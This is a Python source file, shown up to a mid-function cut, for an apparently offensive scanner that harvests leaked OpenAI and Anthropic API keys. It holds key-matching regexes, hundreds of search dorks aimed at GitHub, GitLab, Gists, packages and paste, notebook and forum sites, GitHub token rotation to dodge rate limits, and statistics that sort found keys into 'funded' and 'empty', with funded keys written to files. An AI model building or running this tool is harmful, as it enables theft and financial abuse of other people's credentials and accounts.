from __future__ import annotations

import asyncio
import aiohttp
import dataclasses
import json
import logging
import os
import random
import base64
import html as html_mod
import re
import time
import urllib.parse
import warnings
from abc import ABC, abstractmethod
from collections import defaultdict
from typing import Any

from colorama import Fore, Style, init
from fake_useragent import UserAgent

# ============================================================================
# SECTION 1: DOTENV LOADER & ENVIRONMENT HELPERS
# ============================================================================


def _load_dotenv(path: str = ".env") -> None:
    if not os.path.exists(path):
        return
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            if line.strip() and not line.startswith("#") and "=" in line:
                key, val = line.strip().split("=", 1)
                os.environ.setdefault(key.strip(), val.strip().strip('"').strip("'"))


_load_dotenv()
warnings.filterwarnings("ignore")
init(autoreset=True)


def _env_int(name: str, default: int, *, min_value: int | None = None, max_value: int | None = None) -> int:
    raw = os.getenv(name)
    try:
        value = int(raw) if raw is not None and raw.strip() != "" else default
    except ValueError:
        return default
    if min_value is not None and value < min_value:
        return min_value
    if max_value is not None and value > max_value:
        return max_value
    return value


def _split_env_list(name: str) -> list[str]:
    raw = (os.getenv(name) or "").strip()
    if not raw:
        return []
    parts = re.split(r"[,\s]+", raw)
    return [p for p in (p.strip() for p in parts) if p]


# ============================================================================
# SECTION 2: DUCKDUCKGO SUBPROCESS WORKER
# ============================================================================


def _ddgs_search_worker(query: str, max_results: int, out_q: Any) -> None:
    """Run DuckDuckGo search in a subprocess to isolate Rust panics."""
    import os as _os
    import sys as _sys

    try:
        dn = _os.open(_os.devnull, _os.O_WRONLY)
        _os.dup2(dn, _sys.stdout.fileno())
        _os.dup2(dn, _sys.stderr.fileno())
    except Exception:
        pass

    from duckduckgo_search import DDGS as _DDGS

    with _DDGS() as ddgs:
        out_q.put(ddgs.text(query, max_results=max_results) or [])


def _ddgs_search_in_subprocess(query: str, max_results: int, timeout_s: float = 25.0) -> list[dict[str, Any]]:
    import multiprocessing as mp
    from queue import Empty

    ctx = mp.get_context("spawn")
    q: Any = ctx.Queue()
    p = ctx.Process(target=_ddgs_search_worker, args=(query, max_results, q))
    p.start()
    p.join(timeout_s)
    if p.is_alive():
        p.terminate()
        p.join(1)
        return []
    if p.exitcode != 0:
        return []
    try:
        res = q.get_nowait()
        return res if isinstance(res, list) else []
    except Empty:
        return []


try:
    from duckduckgo_search import DDGS
except ImportError:
    try:
        from ddgs import DDGS  # type: ignore[no-redef]
    except ImportError:
        DDGS = None  # type: ignore[assignment,misc]
        print(f"{Fore.RED}duckduckgo-search is not installed.{Style.RESET_ALL}")


# ============================================================================
# SECTION 3: CONFIGURATION
# ============================================================================

GITHUB_TOKENS: list[str] = _split_env_list("GITHUB_TOKENS")
GITLAB_TOKENS: list[str] = _split_env_list("GITLAB_TOKENS") or (
    [t] if (t := (os.getenv("GITLAB_TOKEN") or "").strip()) else []
)

GITHUB_PAGES: int = _env_int("GITHUB_PAGES", 5, min_value=1, max_value=10)
GITHUB_PER_PAGE: int = _env_int("GITHUB_PER_PAGE", 50, min_value=1, max_value=100)
GITLAB_PER_PAGE: int = _env_int("GITLAB_PER_PAGE", 20, min_value=1, max_value=100)
WEB_MAX_RESULTS: int = _env_int("WEB_MAX_RESULTS", 40, min_value=1, max_value=200)
NPM_SEARCH_SIZE: int = _env_int("NPM_SEARCH_SIZE", 20, min_value=1, max_value=250)
HF_SPACES_LIMIT: int = _env_int("HF_SPACES_LIMIT", 20, min_value=1, max_value=100)

# Controls total concurrent HTTP requests (fetches + verification)
CONCURRENCY_LIMIT: int = _env_int("CONCURRENCY_LIMIT", 150, min_value=1, max_value=500)

# Real-time scanner intervals (seconds)
EVENTS_POLL_INTERVAL: int = _env_int("EVENTS_POLL_INTERVAL", 30, min_value=10, max_value=120)
GIST_POLL_INTERVAL: int = _env_int("GIST_POLL_INTERVAL", 60, min_value=30, max_value=300)
SLOW_LOOP_INTERVAL: int = _env_int("SLOW_LOOP_INTERVAL", 600, min_value=60, max_value=3600)
TOKEN_COOLDOWN_SECONDS: int = _env_int("TOKEN_COOLDOWN_SECONDS", 65, min_value=10, max_value=3600)

EMPTY_TXT: str = os.getenv("EMPTY_TXT", "empty_keys.txt")

# Per-type funded key files (only OpenAI + Anthropic)
FUNDED_FILES: dict[str, str] = {
    "OpenAI": "openai_keys.txt",
    "Anthropic": "anthropic_keys.txt",
}


# ============================================================================
# SECTION 4: KEY PATTERNS
# ============================================================================

KEY_PATTERNS: dict[str, str] = {
    # OpenAI: legacy sk-..., project sk-proj-..., service account sk-svcacct-...
    "OpenAI": r"sk-(?:proj-|svcacct-)?[a-zA-Z0-9\-_]{40,250}",
    # Anthropic: sk-ant-api03-... (future-proof for api04, api05 etc.)
    "Anthropic": r"sk-ant-api\d{2}-[a-zA-Z0-9\-_]{80,150}",
}

# Prefixes for fast pre-check before running regex
_QUICK_PREFIXES: tuple[str, ...] = ("sk-", "sk-ant-")


# ============================================================================
# SECTION 5: DORK DEFINITIONS
# ============================================================================

GITHUB_DORKS: list[str] = [
    # --- Config files ---
    'filename:config.json "sk-proj-"',
    'filename:.env "OPENAI_API_KEY"',
    'filename:.env "ANTHROPIC_API_KEY"',
    'filename:.env.local "OPENAI_API_KEY"',
    'filename:.env.production "OPENAI_API_KEY"',
    'filename:secrets.py "api_key"',
    'filename:settings.py "OPENAI_API_KEY"',
    'filename:config.yaml "openai_api_key"',
    'filename:config.toml "openai_api_key"',
    'filename:appsettings.json "OpenAI"',
    'filename:docker-compose.yml "OPENAI_API_KEY"',
    'filename:docker-compose.yml "ANTHROPIC_API_KEY"',

    # --- Jupyter notebooks ---
    'extension:ipynb "openai.api_key ="',
    'extension:ipynb "sk-proj-"',
    'extension:ipynb "sk-ant-api03-"',
    'extension:ipynb "sk-ant-api04-"',
    'extension:ipynb "ANTHROPIC_API_KEY"',
    'extension:ipynb "anthropic.api_key"',
    'extension:ipynb "claude"',

    # --- AI Frameworks ---
    'path:langchain "OPENAI_API_KEY"',
    'filename:autogpt.json "openai_api_key"',
    'path:crewai "OPENAI_API_KEY"',
    'path:autogen "api_key"',
    'path:llama-index "OPENAI_API_KEY"',
    'path:semantic-kernel "sk-proj-"',
    'path:haystack "OPENAI_API_KEY"',
    'filename:chainlit.md "OPENAI_API_KEY"',
    'path:flowise "sk-proj-"',
    'path:langflow "OPENAI_API_KEY"',
    'filename:streamlit_app.py "sk-proj-"',
    'path:gradio "ANTHROPIC_API_KEY"',

    # --- Shell history ---
    'filename:.bash_history "sk-proj-"',
    'filename:.zsh_history "export ANTHROPIC_API_KEY"',
    'filename:.bash_profile "OPENAI_API_KEY"',

    # --- CI/CD & Build logs ---
    'filename:.github/workflows "OPENAI_API_KEY"',
    'filename:.travis.yml "OPENAI_API_KEY"',
    'filename:Jenkinsfile "OPENAI_API_KEY"',
    'filename:circle.yml "OPENAI_API_KEY"',
    'filename:buildspec.yml "OPENAI_API_KEY"',

    # --- Vercel / Deployment configs ---
    'filename:vercel.json "OPENAI_API_KEY"',
    'filename:now.json "OPENAI_API_KEY"',

    # --- Hardcoded keys by language ---
    '"sk-proj-" language:python',
    '"sk-proj-" language:javascript',
    '"sk-ant-api03-" language:python',
    '"sk-svcacct-" language:python',
    '"sk-proj-" language:typescript',
    '"sk-proj-" language:go',
    '"sk-proj-" language:java',
    '"sk-proj-" language:ruby',
    '"sk-proj-" language:php',
    '"sk-proj-" language:rust',
    '"OPENAI_API_KEY" language:shell',
    '"ANTHROPIC_API_KEY" language:typescript',

    # --- More Anthropic ---
    'filename:.env.local "ANTHROPIC_API_KEY"',
    'filename:secrets.yaml "openai"',
    'filename:terraform.tfvars "openai"',

    # --- Additional high-value targets ---
    'filename:credentials.json "openai"',
    'filename:.bashrc "OPENAI_API_KEY"',
    'filename:.zshrc "ANTHROPIC_API_KEY"',
    'path:tests "sk-proj-"',
    'path:examples "OPENAI_API_KEY"',
    'filename:requirements.txt "openai"',
    'filename:package.json "openai"',
    'filename:constants.py "api_key"',
    'filename:variables.tf "openai"',
    'filename:helm.yaml "OPENAI_API_KEY"',
    'filename:kubernetes.yaml "sk-proj-"',
    'filename:main.go "sk-proj-"',
    'filename:app.js "OPENAI_API_KEY"',
    'filename:index.ts "sk-proj-"',
    'path:src/config "api_key"',
    'extension:yaml "ANTHROPIC_API_KEY"',
    'extension:toml "OPENAI_API_KEY"',
    'extension:ini "sk-proj-"',

    # --- README & Documentation ---
    'filename:README.md "sk-proj-"',
    'filename:README.md "OPENAI_API_KEY"',
    'filename:INSTALL.md "sk-proj-"',
    'filename:SETUP.md "OPENAI_API_KEY"',
    'filename:CONTRIBUTING.md "api_key"',
    'path:docs "sk-proj-"',
    'path:documentation "OPENAI_API_KEY"',

    # --- Test files ---
    'path:test "sk-proj-"',
    'filename:test_config.py "OPENAI_API_KEY"',
    'filename:conftest.py "sk-proj-"',
    'path:__tests__ "OPENAI_API_KEY"',
    'filename:jest.config.js "sk-proj-"',

    # --- Environment examples ---
    'filename:.env.example "sk-proj-"',
    'filename:.env.sample "OPENAI_API_KEY"',
    'filename:.env.template "sk-proj-"',
    'filename:env.sample "ANTHROPIC_API_KEY"',

    # --- Popular repos patterns ---
    'path:backend "OPENAI_API_KEY"',
    'path:server "sk-proj-"',
    'path:api "OPENAI_API_KEY"',
    'path:client "sk-proj-"',
    'path:frontend "ANTHROPIC_API_KEY"',

    # --- Multi-provider configs ---
    'filename:.env "API_KEY" "sk-"',
    'filename:config.json "api_key" "sk-proj-"',
    'filename:application.yml "openai"',
    'filename:application.properties "openai.api-key"',
    'filename:serverless.yml "OPENAI_API_KEY"',
    'filename:cdk.json "OPENAI_API_KEY"',
    'filename:pulumi.yaml "OPENAI_API_KEY"',

    # --- More notebook patterns ---
    'extension:ipynb "client = OpenAI"',
    'extension:ipynb "anthropic.Anthropic"',

    # --- Commit messages (sometimes contain keys) ---
    '"add api key" "sk-proj-"',
    '"update key" "sk-proj-"',
    '"fix api" "sk-proj-"',

    # --- Docker & K8s ---
    'filename:Dockerfile "OPENAI_API_KEY"',
    'filename:Dockerfile "ANTHROPIC_API_KEY"',
    'filename:values.yaml "openai"',
    'filename:configmap.yaml "OPENAI_API_KEY"',
    'filename:secret.yaml "sk-proj-"',

    # --- Terraform & IaC ---
    'filename:main.tf "openai_api_key"',
    'filename:variables.tf "anthropic"',
    'filename:terraform.tfstate "sk-proj-"',

    # --- VS Code settings ---
    'filename:settings.json "openai" "api"',
    'filename:launch.json "OPENAI_API_KEY"',

    # --- Log files ---
    'extension:log "sk-proj-"',
    'extension:log "OPENAI_API_KEY"',

    # ===================== EXTENDED ANTHROPIC COVERAGE =====================
    '"sk-ant-" language:python',
    '"sk-ant-" language:javascript',
    '"sk-ant-" language:typescript',
    '"sk-ant-api03-" language:javascript',
    '"sk-ant-api03-" language:typescript',
    '"sk-ant-api04-" language:python',
    '"sk-ant-api04-" language:javascript',
    'filename:.env "sk-ant-"',
    'filename:.env.local "sk-ant-"',
    'filename:.env.production "ANTHROPIC_API_KEY"',
    'filename:.env.staging "ANTHROPIC_API_KEY"',
    'filename:.env.dev "ANTHROPIC_API_KEY"',
    'filename:config.json "anthropic"',
    'filename:config.yaml "anthropic"',
    'filename:secrets.yaml "anthropic"',
    'filename:settings.py "ANTHROPIC_API_KEY"',
    'filename:constants.py "ANTHROPIC_API_KEY"',
    'filename:.bashrc "ANTHROPIC_API_KEY"',
    'filename:.bash_history "sk-ant-"',
    'filename:.bash_history "ANTHROPIC_API_KEY"',
    'filename:.zsh_history "sk-ant-"',
    'path:langchain "ANTHROPIC_API_KEY"',
    'path:crewai "ANTHROPIC_API_KEY"',
    'path:autogen "ANTHROPIC_API_KEY"',
    'path:llama-index "ANTHROPIC_API_KEY"',
    'path:backend "ANTHROPIC_API_KEY"',
    'path:server "ANTHROPIC_API_KEY"',
    'path:api "ANTHROPIC_API_KEY"',
    'path:tests "sk-ant-"',
    'path:examples "ANTHROPIC_API_KEY"',
    'filename:docker-compose.yaml "ANTHROPIC_API_KEY"',
    'filename:.github/workflows "ANTHROPIC_API_KEY"',
    'filename:Jenkinsfile "ANTHROPIC_API_KEY"',
    'filename:serverless.yml "ANTHROPIC_API_KEY"',
    'filename:vercel.json "ANTHROPIC_API_KEY"',
    'filename:README.md "sk-ant-"',
    'filename:SETUP.md "ANTHROPIC_API_KEY"',
    '"anthropic" "api_key" language:python',
    '"anthropic" "api_key" language:javascript',
    '"claude" "api_key" language:python',
    'extension:log "sk-ant-"',
    'extension:log "ANTHROPIC_API_KEY"',

    # ===================== POPULAR AI APP CONFIGS =========================
    'path:open-webui "api_key"',
    'path:lobe-chat "OPENAI_API_KEY"',
    'path:lobe-chat "ANTHROPIC_API_KEY"',
    'path:chatbox "api_key"',
    'path:librechat "OPENAI_API_KEY"',
    'path:librechat "ANTHROPIC_API_KEY"',
    'path:big-agi "OPENAI_API_KEY"',
    'path:jan "api_key"',
    'path:text-generation-webui "api_key"',
    'filename:dify.yaml "api_key"',
    'path:n8n "OPENAI_API_KEY"',
    'path:anything-llm "api_key"',
    # ===================== NEW FILE TYPES =================================
    'filename:secrets.toml "api_key"',
    'filename:.secrets "sk-"',
    'filename:credentials "openai"',
    'filename:config.fish "OPENAI_API_KEY"',
    'filename:config.fish "ANTHROPIC_API_KEY"',
    'extension:conf "OPENAI_API_KEY"',
    'extension:cfg "api_key" "sk-"',
    'extension:properties "api.key"',

    # ===================== MORE .ENV VARIANTS =============================
    'filename:.env.staging "sk-proj-"',
    'filename:.env.staging "sk-ant-"',
    'filename:.env.dev "sk-proj-"',
    'filename:.env.dev "sk-ant-"',
    'filename:.env.test "OPENAI_API_KEY"',
    'filename:.env.backup "sk-"',
    'filename:env.js "api_key"',
    'filename:env.ts "api_key"',

    # ===================== EXTRA ANTHROPIC HUNT =============================
    '"sk-ant-" language:go',
    '"sk-ant-" language:java',
    '"sk-ant-" language:ruby',
    '"sk-ant-" language:php',
    '"sk-ant-" language:rust',
    '"sk-ant-" language:shell',
    'filename:Makefile "ANTHROPIC_API_KEY"',
    'filename:Taskfile.yml "ANTHROPIC_API_KEY"',
    'filename:terraform.tfstate "sk-ant-"',
    'filename:Procfile "ANTHROPIC_API_KEY"',
    'filename:fly.toml "ANTHROPIC_API_KEY"',
    'filename:render.yaml "ANTHROPIC_API_KEY"',
    'filename:railway.json "ANTHROPIC_API_KEY"',
    'filename:netlify.toml "ANTHROPIC_API_KEY"',
    'path:dify "ANTHROPIC_API_KEY"',
    'path:n8n "ANTHROPIC_API_KEY"',
    '"anthropic_key" language:python',
    '"claude_key" language:python',
    '"claude_api_key" language:python',
    '"CLAUDE_API_KEY" language:python',
    '"CLAUDE_API_KEY" language:javascript',
    'filename:wrangler.toml "ANTHROPIC_API_KEY"',
    'filename:config.ts "ANTHROPIC_API_KEY"',
    'filename:config.js "ANTHROPIC_API_KEY"',

    # ===================== EXTRA OPENAI HUNT ================================
    '"sk-proj-" language:csharp',
    '"sk-proj-" language:swift',
    '"sk-proj-" language:kotlin',
    '"sk-proj-" language:dart',
    '"sk-proj-" language:scala',
    'filename:Makefile "OPENAI_API_KEY"',
    'filename:Procfile "OPENAI_API_KEY"',
    'filename:fly.toml "OPENAI_API_KEY"',
    'filename:railway.json "OPENAI_API_KEY"',
    'filename:render.yaml "OPENAI_API_KEY"',
    'filename:netlify.toml "OPENAI_API_KEY"',
    'filename:wrangler.toml "OPENAI_API_KEY"',
    'filename:config.ts "OPENAI_API_KEY"',
    'filename:config.js "OPENAI_API_KEY"',
    '"openai_key" language:python',
]

GITLAB_DORKS: list[str] = [
    '"sk-proj-"',
    '"sk-ant-"',
    '"OPENAI_API_KEY"',
    '"ANTHROPIC_API_KEY"',
    'filename:.env "sk-proj-"',
    'filename:.env "ANTHROPIC_API_KEY"',
    '"sk-svcacct-"',
    'filename:config.json "openai"',
    'filename:settings.py "api_key"',
    'filename:.env.local "sk-proj-"',
    'filename:.env.production "OPENAI_API_KEY"',
    'filename:docker-compose.yml "OPENAI_API_KEY"',
    'filename:secrets.py "api_key"',
    'filename:config.yaml "openai"',
    'filename:.gitlab-ci.yml "OPENAI_API_KEY"',
    'filename:Dockerfile "OPENAI_API_KEY"',
    'extension:ipynb "sk-proj-"',
    'extension:ipynb "ANTHROPIC_API_KEY"',
    # --- Extended ---
    '"sk-ant-api03-"',
    '"sk-ant-api04-"',
    'filename:.env.staging "OPENAI_API_KEY"',
    'filename:.env.dev "OPENAI_API_KEY"',
    'filename:secrets.toml "api_key"',
    'filename:config.json "anthropic"',
    '"ANTHROPIC_API_KEY" extension:py',
    'filename:.env.local "ANTHROPIC_API_KEY"',
    'filename:.env.production "ANTHROPIC_API_KEY"',
    'filename:docker-compose.yml "ANTHROPIC_API_KEY"',
    'filename:config.yaml "anthropic"',
]

GIST_DORKS: list[str] = [
    'filename:.env "sk-proj-"',
    'filename:script.py "api_key"',
    '"sk-proj-"',
    '"sk-ant-"',
    '"OPENAI_API_KEY"',
    '"ANTHROPIC_API_KEY"',
    'filename:config.json "sk-proj-"',
    '"sk-svcacct-"',
    'filename:.env.local "OPENAI_API_KEY"',
    'filename:secrets.py "sk-proj-"',
    'filename:config.py "ANTHROPIC_API_KEY"',
    'filename:settings.json "openai"',
    'extension:ipynb "openai.api_key"',
    'extension:ipynb "sk-proj-"',
    'filename:.bash_history "sk-proj-"',
    'filename:docker-compose.yml "OPENAI_API_KEY"',
    'filename:main.py "OPENAI_API_KEY"',
    # --- Extended ---
    '"sk-ant-api03-"',
    '"sk-ant-api04-"',
    'filename:.env "ANTHROPIC_API_KEY"',
    'filename:script.py "sk-ant-"',
    'filename:main.py "ANTHROPIC_API_KEY"',
    'filename:config.py "OPENAI_API_KEY"',
    'extension:ipynb "ANTHROPIC_API_KEY"',
    'extension:ipynb "anthropic.Anthropic"',
    'filename:settings.json "anthropic"',
]

PACKAGE_QUERIES: list[str] = [
    "gpt-wrapper", "openai-client", "ai-helper", "chatgpt-bot",
    "llm-chain", "langchain-tool", "claude-sdk", "telegram-gpt",
    "discord-bot-gpt", "slack-ai", "openai-api", "anthropic-api",
    "gpt-bot", "ai-chatbot", "llm-wrapper",
    "openai-integration", "chatgpt-api", "gpt-assistant", "ai-sdk",
    "langchain-openai", "autogpt", "gpt-turbo", "claude-api",
    "openai-tools", "ai-agent", "gpt-chat", "llm-bot",
    "openai-service", "chatgpt-wrapper", "gpt-interface",
    "ai-proxy", "llm-gateway", "multi-llm", "ai-router",
    "anthropic-client", "claude-wrapper", "claude-bot",
]

WEB_DORKS: list[str] = [
    # --- Code paste sites ---
    'site:pastebin.com "sk-proj-"',
    'site:replit.com "OPENAI_API_KEY"',
    'site:jsfiddle.net "sk-proj-"',
    'site:codeshare.io "sk-proj-"',
    'site:paste.ofcode.org "sk-proj-"',

    # --- Cloud storage ---
    'site:s3.amazonaws.com "OPENAI_API_KEY" ext:json',
    'site:firebaseio.com "api_key" "openai"',

    # --- HuggingFace & Google Colab ---
    'site:huggingface.co "sk-proj-"',
    'site:colab.research.google.com "openai.api_key"',
    'site:colab.research.google.com "sk-proj-"',
    'site:colab.research.google.com "ANTHROPIC_API_KEY"',

    # --- Sourcegraph ---
    'site:sourcegraph.com "sk-proj-"',
    'site:sourcegraph.com "OPENAI_API_KEY"',

    # --- Vercel ---
    'site:vercel.app "sk-proj-"',
    'site:vercel.app "OPENAI_API_KEY"',

    # --- Trello (public boards) ---
    'site:trello.com "sk-proj-"',
    'site:trello.com "OPENAI_API_KEY"',

    # --- Jira (public instances) ---
    'site:atlassian.net "sk-proj-"',
    'site:atlassian.net "OPENAI_API_KEY"',

    # --- Build logs ---
    'site:travis-ci.org "OPENAI_API_KEY"',
    'site:app.circleci.com "sk-proj-"',

    # --- Kaggle notebooks ---
    'site:kaggle.com "sk-proj-"',
    'site:kaggle.com "OPENAI_API_KEY"',

    # --- Notion (public pages) ---
    'site:notion.site "sk-proj-"',
    'site:notion.site "OPENAI_API_KEY"',

    # --- Gitee (Chinese GitHub) ---
    'site:gitee.com "sk-proj-"',
    'site:gitee.com "OPENAI_API_KEY"',

    # --- Render / Railway deployment ---
    'site:render.com "OPENAI_API_KEY"',
    'site:railway.app "sk-proj-"',

    # --- Streamlit apps ---
    'site:streamlit.app "sk-proj-"',
    'site:streamlit.app "OPENAI_API_KEY"',

    # --- Gradio / HF Spaces ---
    'site:hf.space "sk-proj-"',
    'site:hf.space "OPENAI_API_KEY"',

    # --- Codepen / StackBlitz ---
    'site:codepen.io "sk-proj-"',
    'site:stackblitz.com "sk-proj-"',

    # --- Deepnote / Observable notebooks ---
    'site:deepnote.com "OPENAI_API_KEY"',
    'site:observablehq.com "sk-proj-"',

    # --- DockerHub ---
    'site:hub.docker.com "OPENAI_API_KEY"',

    # --- Bitbucket ---
    'site:bitbucket.org "sk-proj-"',
    'site:bitbucket.org "OPENAI_API_KEY"',

    # --- Anthropic-specific web ---
    'site:pastebin.com "sk-ant-api"',
    'site:replit.com "ANTHROPIC_API_KEY"',
    '"sk-ant-api" "api_key"',

    # --- Additional paste/share sites ---
    'site:paste.ee "sk-proj-"',
    'site:privatebin.net "OPENAI_API_KEY"',
    'site:justpaste.it "sk-proj-"',
    'site:dpaste.com "OPENAI_API_KEY"',
    'site:ghostbin.com "sk-proj-"',
    'site:hastebin.com "OPENAI_API_KEY"',
    'site:paste.ubuntu.com "sk-proj-"',
    'site:pastelink.net "OPENAI_API_KEY"',
    'site:paste.sh "sk-proj-"',
    'site:gist.github.com "ANTHROPIC_API_KEY"',

    # --- Developer platforms ---
    'site:glitch.com "sk-proj-"',
    'site:glitch.com "OPENAI_API_KEY"',
    'site:heroku.com "sk-proj-"',
    'site:pythonanywhere.com "OPENAI_API_KEY"',
    'site:runkit.com "sk-proj-"',
    'site:sandbox.bio "OPENAI_API_KEY"',

    # --- Documentation sites ---
    'site:gitbook.io "sk-proj-"',
    'site:readme.io "OPENAI_API_KEY"',
    'site:docs.rs "sk-proj-"',

    # --- Cloud providers ---
    'site:blob.core.windows.net "OPENAI_API_KEY"',
    'site:storage.googleapis.com "sk-proj-"',
    'site:digitaloceanspaces.com "OPENAI_API_KEY"',

    # --- Forums & QA ---
    'site:stackoverflow.com "sk-proj-"',
    'site:stackexchange.com "OPENAI_API_KEY"',
    'site:reddit.com "sk-proj-"',
    'site:reddit.com "ANTHROPIC_API_KEY"',

    # --- More notebooks ---
    'site:jupyter.org "sk-proj-"',
    'site:mybinder.org "OPENAI_API_KEY"',
    'site:colab.fan "sk-proj-"',

    # --- Code sandboxes ---
    'site:codesandbox.io "sk-proj-"',
    'site:playcode.io "OPENAI_API_KEY"',
    'site:jsbin.com "sk-proj-"',

    # --- Project management ---
    'site:asana.com "sk-proj-"',
    'site:monday.com "OPENAI_API_KEY"',
    'site:clickup.com "sk-proj-"',

    # --- Multi-provider ---
    '"api_key" "sk-proj-" site:discord.com',
    '"api_key" "sk-proj-" site:telegra.ph',
    '"sk-proj-" site:medium.com',
    '"sk-proj-" site:dev.to',
    '"OPENAI_API_KEY" site:gitpod.io',
    '"sk-proj-" site:codeberg.org',

    # ===================== ANTHROPIC ON ALL SITES =========================
    'site:pastebin.com "ANTHROPIC_API_KEY"',
    'site:pastebin.com "sk-ant-api03"',
    'site:pastebin.com "sk-ant-api04"',
    'site:paste.ee "sk-ant-"',
    'site:dpaste.com "sk-ant-"',
    'site:justpaste.it "sk-ant-"',
    'site:hastebin.com "sk-ant-"',
    'site:privatebin.net "sk-ant-"',
    'site:kaggle.com "ANTHROPIC_API_KEY"',
    'site:kaggle.com "sk-ant-"',
    'site:huggingface.co "sk-ant-"',
    'site:huggingface.co "ANTHROPIC_API_KEY"',
    'site:colab.research.google.com "sk-ant-"',
    'site:deepnote.com "ANTHROPIC_API_KEY"',
    'site:gitee.com "sk-ant-"',
    'site:gitee.com "ANTHROPIC_API_KEY"',
    'site:bitbucket.org "sk-ant-"',
    'site:bitbucket.org "ANTHROPIC_API_KEY"',
    'site:streamlit.app "ANTHROPIC_API_KEY"',
    'site:hf.space "ANTHROPIC_API_KEY"',
    'site:glitch.com "ANTHROPIC_API_KEY"',
    'site:codeberg.org "sk-ant-"',
    'site:sourcegraph.com "sk-ant-"',
    'site:medium.com "sk-ant-api"',
    'site:dev.to "sk-ant-api"',
    'site:notion.site "ANTHROPIC_API_KEY"',
    'site:trello.com "ANTHROPIC_API_KEY"',

    # ===================== CHINESE DEV PLATFORMS ==========================
    'site:csdn.net "sk-proj-"',
    'site:csdn.net "sk-ant-"',
    'site:juejin.cn "sk-proj-"',
    'site:juejin.cn "OPENAI_API_KEY"',
    'site:cnblogs.com "sk-proj-"',
    'site:zhihu.com "sk-proj-"',
    'site:blog.51cto.com "OPENAI_API_KEY"',
    'site:segmentfault.com "sk-proj-"',

    # ===================== TELEGRAM & DISCORD =============================
    'site:telegra.ph "sk-ant-api"',
    'site:telegra.ph "ANTHROPIC_API_KEY"',
    '"sk-ant-" site:discord.com',
    '"ANTHROPIC_API_KEY" site:discord.com',
]


# ============================================================================
# SECTION 6: LOGGING & HTTP INFRASTRUCTURE
# ============================================================================

logger = logging.getLogger("key_scanner")
logger.setLevel(logging.INFO)
_handler = logging.StreamHandler()
_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S"))
logger.addHandler(_handler)


class KeyStats:
    """Thread-safe statistics tracker for found keys."""

    def __init__(self) -> None:
        self._lock = asyncio.Lock()
        self.funded: defaultdict[str, int] = defaultdict(int)
        self.empty: defaultdict[str, int] = defaultdict(int)
        self.total_scanned = 0
        self.start_time = time.time()

    async def add_funded(self, key_type: str) -> None:
        async with self._lock:
            self.funded[key_type] += 1

    async def add_empty(self, key_type: str) -> None:
        async with self._lock:
            self.empty[key_type] += 1

    async def increment_scanned(self) -> None:
        async with self._lock:
            self.total_scanned += 1

    async def print_stats(self) -> None:
        async with self._lock:
            elapsed = time.time() - self.start_time
            hours = int(elapsed // 3600)
            mins = int((elapsed % 3600) // 60)

            print(f"\n{Fore.CYAN}{'='*60}")
            print(f"📊 СТАТИСТИКА КЛЮЧЕЙ (Время работы: {hours}ч {mins}м)")
            print(f"{'='*60}{Style.RESET_ALL}")

            total_funded = sum(self.funded.values())
            total_empty = sum(self.empty.values())

            if total_funded > 0:
                print(f"{Fore.GREEN}💰 FUNDED KEYS (С балансом):{Style.RESET_ALL}")
                for i, (k_type, count) in enumerate(self.funded.items(), 1):
                    print(f"  {i}. {k_type}: {count} шт")
                print(f"{Fore.GREEN}  ИТОГО FUNDED: {total_funded}{Style.RESET_ALL}")

            if total_empty > 0:
                print(f"\n{Fore.YELLOW}📭 EMPTY KEYS (Без баланса):{Style.RESET_ALL}")
                for i, (k_type, count) in enumerate(self.empty.items(), 1):
                    print(f"  {i}. {k_type}: {count} шт")
                print(f"{Fore.YELLOW}  ИТОГО EMPTY: {total_empty}{Style.RESET_ALL}")

            print(f"\n{Fore.CYAN}📈 Всего найдено: {total_funded + total_empty} ключей")
            print(f"🔍 Просканировано текстов: {self.total_scanned}")
            print(f"{'='*60}{Style.RESET_ALL}\n")


class TokenPool:
    """Rate-limit-aware token rotation for GitHub API.

    Tracks X-RateLimit-Remaining / X-RateLimit-Reset per token and always
    picks the token with the most remaining quota.  When all tokens are
    exhausted it async-waits until the earliest reset timestamp.

    Fallback behaviour: if headers are never fed (e.g. non-GitHub pools),
    the pool degrades to the old cooldown-based round-robin.
    """

    # Pre-emptive cooldown threshold: when remaining drops below this
    # value the token is rested until its reset window to avoid wasting
    # the last few calls on search-heavy endpoints.
    _LOW_REMAINING_THRESHOLD = 3

    def __init__(self, tokens: list[str], cooldown: float = 65.0) -> None:
        self._tokens = list(tokens)
        self._fallback_cooldown = cooldown
        # Per-token state
        self._remaining: dict[str, int] = {t: 999 for t in tokens}
        self._reset_at: dict[str, float] = {}      # monotonic timestamp
        self._cooldowns: dict[str, float] = {}      # monotonic timestamp (fallback)
        self._lock = asyncio.Lock()

    # ------------------------------------------------------------------
    # Public properties
    # ------------------------------------------------------------------
    @property
    def empty(self) -> bool:
        return len(self._tokens) == 0

    @property
    def size(self) -> int:
        return len(self._tokens)

    # ------------------------------------------------------------------
    # Feed rate-limit headers after every GitHub API response
    # ------------------------------------------------------------------
    def update_limits(self, token: str, headers: dict[str, str] | None) -> None:
        """Parse X-RateLimit-* headers and update internal counters."""
        if not headers:
            return
        try:
            remaining = int(headers.get("X-RateLimit-Remaining",
                            headers.get("x-ratelimit-remaining", -1)))
            reset_epoch = int(headers.get("X-RateLimit-Reset",
                              headers.get("x-ratelimit-reset", 0)))
        except (ValueError, TypeError):
            return

        if remaining >= 0:
            self._remaining[token] = remaining
        if reset_epoch > 0:
            # Convert wall-clock epoch to monotonic offset
            wall_now = time.time()
            mono_now = time.monotonic()
            delta = max(reset_epoch - wall_now, 0)
            self._reset_at[token] = mono_now + delta

        # Pre-emptive rest: if remaining is very low, park the token
        if remaining >= 0 and remaining <= self._LOW_REMAINING_THRESHOLD:
            reset_mono = self._reset_at.get(token, time.monotonic() + self._fallback_cooldown)
            self._cooldowns[token] = reset_mono
            available = self._count_available()
            logger.info(
                "[TokenPool] Token ...%s low remaining=%d, resting until reset (~%.0fs). "
                "Available: %d/%d",
                token[-6:], remaining,
                max(reset_mono - time.monotonic(), 0),
                available, len(self._tokens),
            )

    # ------------------------------------------------------------------
    # Token selection
    # ------------------------------------------------------------------
    def _count_available(self) -> int:
        now = time.monotonic()
        return sum(1 for t in self._tokens if now >= self._cooldowns.get(t, 0.0))

    def _pick_best(self) -> str | None:
        """Pick the available token with the highest remaining quota."""
        if not self._tokens:
            return None

        now = time.monotonic()

        # Partition into available vs on-cooldown
        available = [(t, self._remaining.get(t, 999))
                     for t in self._tokens
                     if now >= self._cooldowns.get(t, 0.0)]

        if available:
            # Prefer the token with the most remaining requests
